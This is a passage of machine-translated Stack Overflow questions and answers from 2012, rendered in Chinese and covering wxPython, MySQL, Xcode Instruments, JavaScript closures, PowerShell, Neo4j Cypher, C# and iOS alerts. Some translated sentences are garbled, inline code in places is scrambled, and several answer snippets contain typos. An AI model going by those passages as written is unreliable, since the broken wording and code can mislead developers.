> 
> 时间：2012-09-25T16:29:54.437
> 
> 标签：android-webview

我是 android gcm 应用程序开发的新手。如果我的问题不清楚，请提前道歉。

我修改了 GCM 演示客户端程序以在消息到达时显示警报。在警报中单击“确定”后，它应该在我的 Webview 中打开一个不同的 URL。

示例：我的 webview 显示 abc.com 和 gcm 消息到达，它显示一个警报，然后单击 OK 将我带到 xyz.com，这在正常情况下工作正常。

但是当在 abc.com 视图中打开一个不同的警报时会出现问题，这不允许我打开不同的 URL，直到该警报关闭。 **有没有办法强制关闭警报并在 web 视图中打开新 URL。**

# python - Wxpython EVT_CHAR 回调没有被调用

> ID：12587238
> 
> 赞同：2
> 
> 时间：2012-09-25T16:30:03.907
> 
> 标签：python, wxpython

我有一个 OpenGL wxpython 应用程序，我正在尝试在 Ubuntu 中工作。它是在 Mac OSX 上（由其他人）开发的，在那里工作得很好。

我遇到的最后一个突出问题是键盘事件没有被捕获。

代码看起来像这样：

```
class GLFrame(wx.Frame):
     def __init__(...):
         ...
         self.canvas.Bind(wx.EVT_MOTION, self.mouseMotion)
         self.canvas.Bind(wx.EVT_CHAR, self.character)
         ...

def character(self, evt):
    print "EVT_CHAR"
    # do stuff

def mouseMotion(self, evt):
    print "EVT_MOTION"
    # do stuff 
```

我已经为 Bind 调用准备了整个代码库，没有其他东西在使用 EVT_CHAR、EVT_KET_DOWN 或 EVT_KEY_UP。我也尝试过 EVT_KEY_DOWN 和 EVT_KEY_UP，但它们都不起作用。

我也尝试过更改绑定调用

```
self.canvas.Bind(...) 
```

至

```
self.Bind(...) 
```

这会破坏 EVT_MOTION，并且仍然不会调用 EVT_CHAR 回调。

是否有任何调用可以在键盘事件到达 GLFrame 之前捕获它们？我是 wxpython 的新手，虽然它对我来说很有意义，但我确信有一些我不知道的“陷阱”。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-04T17:23:59.173

根据 wxpython Google 小组的说法，wx.Frame 是否接收键盘事件取决于实现。Ubuntu 实现不接收它们。

来自：[https ://groups.google.com/d/msg/wxpython-users/dF2gf5KvFhE/M_-aRuG3aWUJ](https://groups.google.com/d/msg/wxpython-users/dF2gf5KvFhE/M_-aRuG3aWUJ)

> wx.Frames 是否能够捕获关键事件不是由 wx 定义的，因此取决于实现。它可能在某些平台上运行的事实基本上只是一个快乐的巧合。我不确定 GLCanvas 类，但如果它有焦点，我希望它能够做到。您可能需要通过从计时器或其他东西执行“打印 wx.Window.FindFocus()”之类的操作来仔细检查焦点所在的位置。

事实证明，GLCanvas 可以很好地接收键盘事件。不管什么原因，它没有得到焦点。打电话

```
self.canvas.SetFocus() 
```

解决了这个问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T18:07:30.797

尝试绑定到框架而不是画布..

```
class GLFrame(wx.Frame):
    def __init__(self,*args,**kwargs):
        wx.Frame.__init__(self,*args,**kwargs)
        self.Bind(wx.EVT_MOTION, self.mouseMotion)
        self.Bind(wx.EVT_CHAR, self.character)

    def character(self, evt):
        print "EVT_CHAR"
        # do stuff

    def mouseMotion(self, evt):
        print "EVT_MOTION"

a = wx.App(redirect=False)
f = GLFrame(None,-1)
f.Show()
a.MainLoop() 
```

# php - 获取相关标签的 COUNT()

> ID：12587241
> 
> 赞同：0
> 
> 时间：2012-09-25T16:30:11.333
> 
> 标签：php, mysql

我的 mySQL 知识碰壁了。

为了更清楚地解释它，这里是我的表格（一个非常标准的标签设置）：

```
keywords
---
keyword_id (ai)
keyword 
```

-

```
topics_keywords
---
t_k_id (ai)
topics_id
keyword_id 
```

-

```
topics
---
topics_id
etc 
```

现在，假设该`keywords`表具有以下条目：

```
keyword_id || keyword
1 || baseball
2 || sports 
```

topic_keywords 具有以下条目：

```
t_k_id || topics_id || keyword_id
1 || 1 || 1 
2 || 1 || 2
3 || 2 || 1 
```

所以也许你可以看到我想要做什么。

如果有人输入“棒球”，我想计算有多少主题共享相关关键字。在上面的示例中，`baseball`和`sports`都是 的共享关键字`topics_id: 1`。

因此，如果有人输入`baseball`我将如何获得显示还有 1 个其他主题的 count()，命名为`sports`与 共享主题`baseball`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T16:43:47.697

如果我对您的理解正确，您可能需要考虑运行以下内容：

SQL小提琴：[http ://sqlfiddle.com/#!2/9e6be/6](http://sqlfiddle.com/#!2/9e6be/6)

```
SELECT COUNT(*)                                                             
  FROM keywords
  JOIN topics_keywords
 USING (keyword_id)
 WHERE keyword != 'value'
   AND topics_id IN (
         SELECT topics_id
           FROM keywords 
           JOIN topics_keywords 
          USING (keyword_id)
          WHERE keyword = 'value' ); 
```

也就是说，您正在选择没有您要查找的关键字但具有您要查找的关键字的 topic_id 的 topic_keywords 计数。

# instruments - 自动化仪器拒绝命令后如何重置仪器

> ID：12587243
> 
> 赞同：6
> 
> 时间：2012-09-25T16:30:24.860
> 
> 标签：instruments, ios-ui-automation

(Xcode 4.5)

从命令行运行仪器时，它第一次工作，但直到我重新启动后才会再次运行。

Instruments 的详细输出包括：

```
Instruments : Loading template 'file://localhost/Applications/Xcode.app/Contents/Applications/Instruments.app/Contents/PlugIns/AutomationInstrument.bundle/Contents/Resources/Automation.tracetemplate'
Instruments : Setting Instrument Trace Command : Instrument Command (purpose:Idle; output destination:file://localhost/Users/xxxxx/instrumentscli0.trace)
Instruments : Trace Command Recognized
Instruments : Instrument 'Automation - MyProject' rejected command 'Instrument Command (purpose:Trace; output destination:file://localhost/Users/xxxxx/instrumentscli0.trace)' for target 'Executable (name:MyProject; arguments:)'
Instruments : Instruments Rejected Command
Instruments Trace Error : Failed to start trace. 
```

我用来运行仪器的命令行是这样的（为了清楚起见，分成多行）：

```
instruments -v -w <DeviceID>
-t /Applications/Xcode.app/Contents/Applications/Instruments.app/Contents/PlugIns/AutomationInstrument.bundle/Contents/Resources/Automation.tracetemplate
/Users/xxxxx/dev/MyProject/build/Debug-iphoneos/MyProject.app
-e UIASCRIPT /Users/xxxxx/dev/MyProject/UIAutoTests/some_test.js 
```

我尝试比较在第一次（成功）运行之前和之后正在运行的进程 using`ps`以及在 using 之前和之后打开了哪些文件/管道`lsof`，但我找不到任何可以说明为什么它不会运行多次的信息。

该错误似乎表明仪器中的自动化仪器正在拒绝该`purpose:Trace`命令，因此我尝试删除输出跟踪目录（以防自动递增的文件名导致问题），我尝试使用不同的模板运行仪器在运行之间查看这是否清除了阻止它的任何东西，但每次重新启动时我不能让它工作不止一次。

我怀疑自动化仪器或仪器使用的共享库中有一些无效状态。我需要一种从命令行重置此状态的方法，以便我可以在 CI 服务器上可靠地运行自动化测试。

有没有办法比较之前/之后加载哪些共享库并卸载它们？有没有人对可能持续存在的内容以及如何重置它有任何其他想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T09:05:44.220

尝试下载 Xcode 4.4.1（iOS 开发中心）并使用它的工具 4.4（4445）。这个版本适用于我所有的设备。

仅供参考，当我使用 4.5+，甚至 4.6DP4 时，只有 iOS6 设备正常响应；其他人会因与您相同的信息而失败。试一试，如果 4.4 效果不好，甚至可能是 4.3.3。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-13T17:22:23.093

对于其他遇到此问题的人，我将解释什么对我有用以及我如何解决这个问题。

我执行了`ps`命令来查看哪些进程正在运行。我发现仪器仍在运行。然后我做了`killall instruments`，这杀死了仪器进程。然后我做了我的仪器命令，之后它工作得很好。

# actionscript-3 - AS3 - 如果在某个位置，对象不允许移动

> ID：12587244
> 
> 赞同：1
> 
> 时间：2012-09-25T16:30:29.573
> 
> 标签：actionscript-3, flash

因此，玩家可以使用空格键跳跃，并有重力将他拉向地板。我想要的是，如果他不在地板上，你不能再按跳跃，直到你跌倒。我尝试制作一个布尔值并将其实现为运动，但仍然没有结果。知道我该怎么做吗？

```
var keyPressed:int = -1;

player.addEventListener(Event.ENTER_FRAME, iMoveInDirectionOfKey);
stage.addEventListener(KeyboardEvent.KEY_DOWN, iSetKeyPressed);
stage.addEventListener(KeyboardEvent.KEY_UP, iUnsetKeyPressed);

function iSetKeyPressed(event:KeyboardEvent):void
{
if (canJump == true) {
    keyPressed = event.keyCode;
} else if (canJump == false) {
    keyPressed = -1;
}
}
function iUnsetKeyPressed(event:KeyboardEvent):void
{
keyPressed = -1;
}
function iMoveInDirectionOfKey(event:Event)
 {
player.y += keyPressed == Keyboard.SPACE ? -20 : 0;
 }

var gravity:Number = 15;
var floor:Number = stage.stageHeight - player.height / 2 + 35;
var canJump:Boolean = true;

iCanJump(canJump);

player.y = floor;

player.addEventListener(Event.ENTER_FRAME, iGravity);

function iGravity(pEvent)
{
if (keyPressed != Keyboard.SPACE) {
    player.y +=  gravity;
}
if (player.y > floor) {
    player.y = floor;
}
}

function iCanJump (canJump:Boolean) {
if (player.y == floor) {
    canJump = true;
} 
if (player.y < floor) {
    canJump = false;
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T16:51:40.227

使用这样的速度变量：

```
public var jumpSpeed : Number = -20;
public var ySpeed : Number = 0;
public var gravity : Number = 1;
function iSetKeyPressed(e:KeyboardEvent):void
{
    if(e.keyCode == Keyboard.SPACE && player.y == floor)
        ySpeed = jumpSpeed; 
}

player.addEventListener(Event.ENTER_FRAME, iGravity);

function iGravity(e : Event)
{
    player.y += ySpeed;
    if(player.y < floor)
    {
        ySpeed += gravity;
    }
    else
    {
        ySpeed = 0;
        player.y = floor;
    }
} 
```

您基本上为玩家创建了一个速度变量并在每回合更新它。您也可以通过玩家速度更新玩家在 y 轴上的位置。

如果您继续工作，您甚至可以检查帧之间的时间并将速度乘以时间以获得平滑的结果。

祝你好运。

# javascript - 带有innerHTML问题的for循环中的基本getJSON

> ID：12587246
> 
> 赞同：0
> 
> 时间：2012-09-25T16:30:31.380
> 
> 标签：javascript, json, innerhtml

因此，我试图获得一系列 json 结果，以使用 innerHTML 在 div 标记中呈现自身。

```
 <script>
    $(document).ready(function() {
        var html2 = '';
        var thread_id = '';
        var created_thread_ids = new Array(123123, 12312312, 1231222);
        for (var i in created_thread_ids)
        {
            thread_id = created_thread_ids[i];
            $.getJSON(ravenUrl + '/docs/threads/' + thread_id, function(thread){
                html2 += '<div class="result">' + thread.Title + thread_id + '</div>';
                document.getElementById("showit").innerHTML = html2;
            });
        }
    });
    </script>

    <div id="showit"></div> 
```

我的问题是变量 thread.Title 工作正常，但变量 thread_id 仅在第一次访问 url 并找到正确的 url 时有效，但第二次在每个线程之后显示相同的 id。像这样：

```
<div id="showit">
<div class="result">This is the first title123123</div>
<div class="result">This is the second title123123</div>
<div class="result">This is the third title123123</div>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T16:48:13.493

您传递给`$.getJSON`方法的回调函数是一个闭包，并且由于该方法是异步的，`thread_id`因此将使用执行时间的值。这是一个常见的问题，并且有几种解决方法，最常见的是使用包装函数：

```
for (var i in created_thread_ids)
  (function(i){
  ...
  var thread_id = created_thread_ids[i];
  $.getJSON(ravenUrl + '/docs/threads/' + thread_id, function(thread){
    html2 += '<div class="result">' + thread.Title + thread_id + '</div>';
    document.getElementById("showit").innerHTML = html2;
  });
  ...
  }(i));
} 
```

... 要不就 ...

```
for (var i in created_thread_ids) {
  var thread_id = created_thread_ids[i];
  $.getJSON(ravenUrl + '/docs/threads/' + thread_id, 
     ( function(thread_id) {
           return function(thread) {
               html2 += '<div class="result">' + thread.Title + thread_id + '</div>';
               document.getElementById("showit").innerHTML = html2;
           };
     }(thread_id) ) 
  );
} 
```

作为旁注，我强烈建议在用于遍历数组时将`(for..in)`结构替换为方便（或者，作为替代方案，考虑使用有用的 jQuery 方法）。`for(;;)``$.each`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T16:40:49.373

首先，正如 Muth 所说，您应该使用数组而不是字符串

```
var createdThreadIds = [123123, 12312312, 1231222] 
```

其次，你的代码是异步的，你不知道你的 ajax 调用是如何回调的，它们都可能混在一起。

第三，我建议您使用 ajax 调用返回的 Defered 对象，并且仅在执行所有调用时才更新 DOM。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-25T16:33:29.643

你`created_thread_ids`是一个字符串，它应该是一个数组。

改变

```
var created_thread_ids = '123123, 12312312, 1231222'; 
```

至

```
var created_thread_ids = new Array(123123, 12312312, 1231222); 
```

# javascript - 在 jQuery 中创建一个包含多个 DOM 元素和动画的动画队列并按顺序触发它们？

> ID：12587252
> 
> 赞同：5
> 
> 时间：2012-09-25T16:30:58.933
> 
> 标签：javascript, jquery, jquery-animate, queue

> **可能重复：**
> [jQuery 中的非嵌套动画序列？](https://stackoverflow.com/questions/6829413/a-non-nested-animation-sequence-in-jquery)

我有一个 html/css/js iOS 应用程序，它当前有几个同时触发的动画。这不仅不是想要的效果，而且对于某些 iOS 设备来说，一次处理所有的东西太多，导致动画不连贯。

我想做的是 .animate() 一切，我想将动画添加到队列中，然后按顺序触发它们。这里的挑战是动画分布在整个应用程序中。

我无法用 .queue() 或其他任何东西来追踪如何做到这一点......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T01:48:53.197

jQuery 网站上的这个示例可能有助于解决这个问题——在同一个元素上制作多个动画。该示例显示了使用队列一次或按顺序对动画进行排序：

[http://api.jquery.com/animate/#example-2](http://api.jquery.com/animate/#example-2)

还请注意上面的 MLM 评论，用于在几个元素上排队动画：

[jQuery中的非嵌套动画序列？](https://stackoverflow.com/questions/6829413/a-non-nested-animation-sequence-in-jquery)

# powershell - 如何在powershell中修改GOPATH

> ID：12587253
> 
> 赞同：7
> 
> 时间：2012-09-25T16:31:10.687
> 
> 标签：powershell, go

我正在尝试将我的项目目录添加到 GOPATH，在 linux 中我可以做到

`export GOPATH=$HOME/mygo` 在 ~/.bashrc

powershell中的等价物是什么

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-25T16:44:06.043

这应该遵循您使用 Powershell 设置任何环境变量的方式（如[本文所述](http://technet.microsoft.com/en-us/library/ff730964.aspx)）：

如果您希望它是永久的（即将适用于任何未来的外壳）：

```
[Environment]::SetEnvironmentVariable("GOPATH", "C:\Your\Path", "User") 
```

> 需要注意的一件事：当我们过去`SetEnvironmentVariable`创建一个新的用户或机器级环境变量时，当我们在 Windows PowerShell 中运行此命令时，该变量并不总是显示出来：

```
Get-ChildItem Env: 
```

> 或者至少在我们重新启动 PowerShell 之前它没有出现。（或者启动一个新的 PowerShell 实例。）
> 但是，我们可以随时使用以下命令检索新变量的值：

```
[Environment]::GetEnvironmentVariable("GOPATH","User") 
```

* * *

如果您只希望它用于当前的外壳，如[cmotley](https://stackoverflow.com/users/1172023/cmotley)的[回答](https://stackoverflow.com/a/12587758/6309)中所述并在同一篇文章中详述：

```
$env:GOPATH = "C:\Your\Path" 
```

正如[Jaykul](https://stackoverflow.com/users/8718/jaykul)评论的那样，在您的中设置该行`%UserProfile%\My Documents\WindowsPowerShell\profile.ps1`相当于在中导出`~\.bashrc`：
请参阅“ [Windows PowerShell 配置文件](http://technet.microsoft.com/en-us/library/bb613488%28v=VS.85%29.aspx)”。
（实际上有 4 个配置文件，提到的一个配置文件仅适用于当前用户，但会影响所有 shell）

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-09-25T17:03:29.457

或者，您可以这样做：

`$env:GOPATH = "$HOME\mygo"`

# javascript - 从选定的 td 中获取价值

> ID：12587255
> 
> 赞同：0
> 
> 时间：2012-09-25T16:31:14.250
> 
> 标签：javascript, jquery, html, jsp, jquery-ui-selectable

目前我有一个可选择的表格，我可以在列中拖动和选择 tds。但是我想从每个 td 单元格中获取所有值。我该怎么做呢？我试过 .each() 但它仍然不起作用

```
<style type="text/css">
.ui-selecting { background: #FECA40; }
.ui-selected { background: #F39814; }
</style>

<script>
    $(function() {
    $("table").selectable({
        filter: ".tdItem"
    });
});
</script>
</head>     

<body>

<table width="100%" border="1">
<%
    for(String t: time){
        out.println("<tr>");
        int i=0;
        for(String room: rooms){
            out.println("<td class='tdItem' align='center'>");
            out.println(room+" "+t);
            out.println("</td>");
            i++;
        }
        out.println("</tr>");
    }
%> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T16:35:31.810

您可以遍历文档中的所有 td 并检查是否有选定的类..

如果是，那就试试这个

```
var $td = $('tr td');

$.each($td , function(i){
     if( $(this).hasClass('tdItem'){
        console.log($(this).text())
     }
});
​ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T16:36:12.923

您可以使用 element.innerText 来获取任何 HTML 元素的文本内容。例如，在此页面上，您可以使用`$(".question-hyperlink")[0].innerText`来获取问题文本。$(selector)[0] 是一个普通的旧 HTML 元素。

或者，留在 jQuery 中，您可以使用`$(selector).text()`它来做同样的事情。类似的东西的`$(".question-hyperlink").text()`工作方式完全相同。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-25T16:38:10.513

获取每个 TR 的 TD

```
$('table tr').each( function(i){
     $('td',this).each(function(){
           console.log($(this).text())
    });

}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-25T18:42:54.473

可选择的插件将类添加`ui-selected`到任何选定的元素，所以很简单：

```
$('.ui-selected') 
```

将为您提供所有选定的元素。`.tdItem`如果您有其他可选择的东西，请使用以下方法限制您的 s：

```
$('.tdItem.ui-selected') 
```

如果你想在每次选择改变时做一些事情，那么你可以[在options中使用`selected`or`stop`回调`.selectable({...})`](http://jqueryui.com/demos/selectable/)。把它们放在一起会给我们一些类似的东西：

```
function afterSelectionChanged(event, ui){    
    var $selectedElements = $('.tdItem.ui-selected');
    // Do something with the selected elements
}

$("table").selectable({
    filter:'.tdItem',
    stop: afterSelectionChanged 
}); 
```

[请参阅此处的 jsfiddle 演示](http://jsfiddle.net/nXKWF/9/)。

# neo4j - 按路径成本的密码顺序

> ID：12587263
> 
> 赞同：2
> 
> 时间：2012-09-25T16:31:33.467
> 
> 标签：neo4j, cypher

我对 cypher 和 neo4j 非常陌生。我想根据总路径成本获取和订购点 A 和 B 之间的所有路径。在这种情况下，成本是一个整数关系属性。路径成本将是关系属性的总和。

我正在查看 cypher 的 ORDER BY 语句的一些示例，但是，通过这些示例，您似乎必须按已经分配给被排序对象的属性进行排序，在这种情况下，由于路径没有一个静态的“成本”属性。

（这与路径的长度/数量不同）

我很确定这样的事情对于密码来说并不太复杂。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-25T17:23:03.973

几天前，我尝试并没有做与此非常相似的事情。问题在于您无法获得集合的总和，而只能获得聚合的总和。

请参阅： [https ://groups.google.com/d/topic/neo4j/_MqwGp1a1Oo/discussion](https://groups.google.com/d/topic/neo4j/_MqwGp1a1Oo/discussion)

我希望他们会在 Cypher 中为此添加一些功能，但即使在专家 Michael Hunger 的帮助下，我也无法让它工作。

**更新**我今天实际上戳了一下 Cypher 代码，以制作一个完全可以做到这一点的表达式。我不确定它是否会被 1.9 接受，但也许它的某种形式会很快进入社区版。

**更新 2**他们已在我的拉取请求中合并`reduce`到 1.9-SNAPSHOT，我将更新下面的语法。

它基本上完全符合您的要求——我的数据的一个稍微陈旧的版本在这里： [http ://console.neo4j.org/r/2rvznu](http://console.neo4j.org/r/2rvznu)

这是 Cypher（**注意，目前需要 1.9-SNAPSHOT**）：

```
 START n=node(18) 
   MATCH p=n-[r*]->m 
   WHERE not(m-->()) 
    WITH extract(x in r: x.score) as scores, length(p) as len
  RETURN scores, reduce(res=0, x in scores: res + x) as totalscore, len 
ORDER BY totalscore desc; 
```

给出：

```
+------------------------------------------+
| scores        | totalscore         | len |
+------------------------------------------+
| [0.9,0.9,3.7] | 5.5                | 3   |
| [0.8,0.79]    | 1.59               | 2   |
| [0.4,0.75]    | 1.15               | 2   |
| [0.4,0.45]    | 0.8500000000000001 | 2   |
+------------------------------------------+ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-05-26T21:53:32.107

为了方便大家在谷歌上搜索这个问题，我将@eve-freeman 的答案更新为 Neo4j 3.0

```
START n=node(18) 
   MATCH p=(n)-[r*]->(m) 
   WHERE not((m)-->()) 
    WITH extract(x in r| x.score) as scores, length(p) as len
  RETURN scores, reduce(res=0, x in scores| res + x) as totalscore, len 
ORDER BY totalscore desc; 
```

区别在于： 需要括号来标识模式中的节点 而不是冒号：用于分隔“列表中的变量”和函数中的表达式

# c# - c# - 添加到 string[] 成员

> ID：12587266
> 
> 赞同：1
> 
> 时间：2012-09-25T16:31:48.447
> 
> 标签：c#, asp.net, linq, visual-studio

我有一个名为 lst 的 List<string[]>：

```
[0] "ABC" "DEF" "GHI"
[1] "JKL" "MNO" "PQR"
[2] etc, etc... 
```

如何在每个 lst 成员的末尾添加另一个字符串？

字符串 s = "EndOfBlock";

```
[0] "ABC" "DEF" "GHI" "EndOfBlock"
[1] "JKL" "MNO" "PQR" "EndOfBlock"
[2] etc, etc... 
```

谢谢你。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-25T16:35:51.077

应该是这样的：

```
var lst = new List<string[]>();
lst.Add(new string[] { "ABC", "DEF" });
lst.Add(new string[] { "GHI", "JKL" });

foreach (var item in lst)
{
    Console.WriteLine(item.Length);
}

for (int i = 0; i < lst.Count; ++i)
{
    var array = lst[i];
    Array.Resize(ref array, array.Length + 1);
    array[array.Length - 1] = "EndOfBlock";
    lst[i] = array;
}

foreach (var item in lst)
{
    Console.WriteLine(item.Length);
} 
```

[`Array.Resize`参考](http://msdn.microsoft.com/en-us/library/bb348051.aspx)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-25T16:42:10.257

正如评论者所指出的，听起来你真的想要一个`List<List<string>>`. 但是，如果您想坚持使用`List<string[]>`，这就是我扩展每个数组的方式。

```
List<string[]> list = ...
for(int i = 0; i < list.Count; i++)
{
    // copy to a local variable (list[i] is a property, which can't be passed 'ref')
    string[] array = list[i];

    // resize the local variable. (this creates a new string[] object)
    Array.Resize(ref array, array.Length + 1);
    array[array.Length - 1] = "EndOfBlock";

    // put the new object back in the list, replacing the old smaller one.
    list[i] = array;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-25T16:39:42.807

我还建议您使用`List<List<string>>`：

```
List<List<string>> lst = new List<List<string>>();
lst.ForEach(i=>i.Add("EndOfBlock")); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-25T16:46:25.777

如果要保留数组列表，可以这样做：

```
List<string[]> lst = new List<string[]); //Where this is the poplated list instead of new;
for (ini i = 0; i < lst.Count; i++)
{
   List<string> tmpList = new List<string>(lst[i]);
   tmpList.Add("EndOfBlock");
   lst[i] = tmpList.ToArray();
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-25T16:44:45.920

如果你真的想这样做，`IList<string[]>`你可以这样做，

```
var lst = new List<string[]>
{
    { "ABC", "DEF", "GHI" },
    { "JKL", "MNO", "PQR" },
    ...
}

var blockEnd = new string[] { "EndOfBlock" };

lst = lst.Select(a => 
    (a.Select(s => s).Concat(blockEnd))
    .ToArray()).ToList(); 
```

如果`lst`是`Ilist<Ilist<string>>`.

```
var lst = new List<List<string>>
{
    { "ABC", "DEF", "GHI" },
    { "JKL", "MNO", "PQR" },
    ...
}

foreach(var row in lst)
{
   row.Add("EndOfBlock");
} 
```

# javascript - 动态插入内容后重新启动一个jQuery插件

> ID：12587271
> 
> 赞同：0
> 
> 时间：2012-09-25T16:32:03.967
> 
> 标签：javascript, jquery, html, css, plugins

我有一个运行良好的 jQuery 选项卡插件......但是我有一个灯箱（也是动态生成的），它允许用户选择然后显示在选项卡中的内容。

如果用户选择内容，离开页面并返回，这很好用。但是我希望标签在用户完成选择内容后立即工作。

我已经尝试过通常的 .delegate() 标签，但我应该将它们附加到哪个事件？我曾尝试在灯箱上的“保存”按钮上执行此操作，但由于这也是动态生成的，因此它似乎不起作用。

有任何想法吗？

谢谢！

# c# - 如何在 WPF 中将弹出控件设置为模态？

> ID：12587273
> 
> 赞同：0
> 
> 时间：2012-09-25T16:32:10.350
> 
> 标签：c#, .net, wpf, messagebox, caliburn.micro

首先，我在我的项目中使用 Caliburn Micro 来处理 MVVM。

我没有使用 ，而是`System.Windows.MessageBox.Show()`使用 caliburn Micro 实现了我自己的 MessageBox。

```
windowManager.ShowPopup(viewModel); 
```

但是现在，我希望这个 Popup 成为模型，这样用户就不能与其他 UI 交互，除非 MessageBox 收到反馈。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T16:34:18.830

`WindowManager.ShowPopup`您可以使用 ，而不是使用`WindowManager.ShowDialog`。这应该将您的 ViewModel 放入一个模式对话框并显示它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T16:47:26.623

您没有表达 ShowDialog 无法获得的设计，所以不得不猜测。

正如 Reed +1 所说，ShowPopup 不是模态的。

NavigationWindow.ShowDialog 会给你你想要的吗？您可以在 NavigationWindow 中托管页面。

[导航窗口](http://msdn.microsoft.com/en-us/library/system.windows.navigation.navigationwindow_methods.aspx)

# wordpress - 插件中的 register_theme_directory 不起作用

> ID：12587275
> 
> 赞同：0
> 
> 时间：2012-09-25T16:32:11.803
> 
> 标签：wordpress, plugins

我正在尝试在我的插件目录中注册一个主题文件夹，以便我可以为页面和内容提供“标准”主题。如果他们愿意，用户可以在他们自己的主题文件夹中覆盖这些，但至少有一个用户的“骨架”。

我发现了这个功能`register_theme_directory()`，但它似乎没有按预期工作。

这是我的代码：

```
add_filter('init', 'test_templates_dir');
function test_templates_dir(){
    $plugindir = dirname( __FILE__ );
    register_theme_directory($plugindir."/themefiles");
} 
```

在我的`$plugindir."/themefiles"`目录中，我有一个名为的文件`tpl-directory.php`，在该模板文件中，我有这个：

```
<?php
/*
 *Template name: Directory template
 */
?> 
```

但是，当我“添加新”页面时，这不会出现在可用模板列表中。

我究竟做错了什么？有人知道吗？或者有谁知道更好的方法来做我想要实现的目标？我已经读过没有过滤器或挂钩可以“手动添加模板文件”（尽管如果我能这样做，我会很高兴的！）。

非常感谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T23:56:49.527

抱歉，该功能只能让 wp 在该文件夹中查找更多主题，而不是页面模板。

显然没有办法将页面模板添加到当前活动主题，但您可以捕获当前类型的内容以从插件内部加载特定模板，或者在激活时在当前主题内添加新模板文件。

有关更多详细信息，请参阅此线程： [WP - 将插件目录中的文件用作自定义页面模板？](https://stackoverflow.com/questions/4647604/wp-use-file-in-plugin-directory-as-custom-page-template)

# objective-c - UIAlertView 不显示在 iPhone 上

> ID：12587276
> 
> 赞同：2
> 
> 时间：2012-09-25T16:32:16.873
> 
> 标签：objective-c, ios, uialertview

我创建了一个通用方法方法来显示警报视图。我已附加我的代码以供审查。我正在尝试验证三个 uitextfields，如果无效，请将相关信息放入 uialertview 方法中使用的实例变量中。您可以看到我在代码中散布了大量的 nslog 语句。方法开头和结尾的 nslog 都显示发生的错误的相关信息。当我单击模拟器屏幕中设置此动作的按钮时，没有显示任何消息，但屏幕背景为浅灰色，将变为深灰色。

这是代码：

```
- (void)SendErrorMessage
{
    NSLog(@"Starting SendErrorMessage");
    NSLog(@"initWithTitle = %@", self.alertViewTitleText);
    NSLog(@"message = %@", self.alertViewMessageText);
    NSLog(@"cancelButtonTitle = %@", self.alertViewCancelButtonText);

    UIAlertView *alert = [[UIAlertView alloc]
                         initWithTitle:self.alertViewTitleText
                         message:self.alertViewMessageText
                         delegate:nil cancelButtonTitle:
                         self.alertViewCancelButtonText
                         otherButtonTitles:nil];
    [alert show];
    NSLog(@"Finished SendErrorMessage");
    return;

} 
```

对此的任何帮助将不胜感激。

好的，

我现在真的很困惑。我进入代码并在 [alert show] 下方添加了以下代码： // Block for 5 seconds [NSThread sleepForTimeInterval:5.0];

我这样做是为了查看 alertview 是否真的被快速显示。不，根据我的日志，程序坐了 5 秒钟，然后继续执行程序逻辑。我还用 uiactionsheet 替换了 uialertview，以查看它是否会显示 uialertview 不显示的位置。再一次，不，它们都不会显示在模拟器屏幕上。

这是我的 .h 文件中的接口声明：
@interfaceBeginningScene：UIViewController，（小于）UIActionSheetDelegate，UITextViewDelegate，UIAlertViewDelegate（大于）

再次感谢您的帮助，任何想法将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T21:24:51.320

你确定这是在主线程上运行的吗？在调用 sendErrorMessage 时尝试使用它

```
[self performSelectorOnMainThread:@selector(sendErrorMessage)]; 
```

跳过return语句，没有用。

无论如何，试试这段代码并将方法复制到你的头文件中，注意小写的 S，只是一个偏好。

```
- (void)sendErrorMessage
{
    UIAlertView *alert = [[UIAlertView alloc]
                      initWithTitle:@"Title"
                      message:@"message"
                      delegate:nil cancelButtonTitle:
                      @"OK"
                      otherButtonTitles:nil];
[alert show];
[alert release]; // if you are not using ARC
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T18:53:40.650

您可以在将显示 UIAlertView（.h 头文件）的类中尝试以下内容：

```
@interface ViewController : UIViewController <UIAlertViewDelegate> 
```

然后，在 .m 实现中，将委托设置为`self`创建 UIAlertView 时：

```
 UIAlertView *alert = [[UIAlertView alloc]
                     initWithTitle:self.alertViewTitleText
                     message:self.alertViewMessageText
                     delegate:self cancelButtonTitle:
                     self.alertViewCancelButtonText
                     otherButtonTitles:nil]; 
```

希望这可以帮助。

# php - PHP数组计数成一个变量

> ID：12587278
> 
> 赞同：0
> 
> 时间：2012-09-25T16:32:26.740
> 
> 标签：php, arrays, echo

我这里有这个数组...

$previousBalance2 里面有 17 条记录

我把 17 放在一个像这样的变量中..

```
$i = count($previousBalance2); 
```

我回显了`$i`变量并得到了 17

当我尝试这个回声时

```
echo $previousBalance2[$i]['total']; 
```

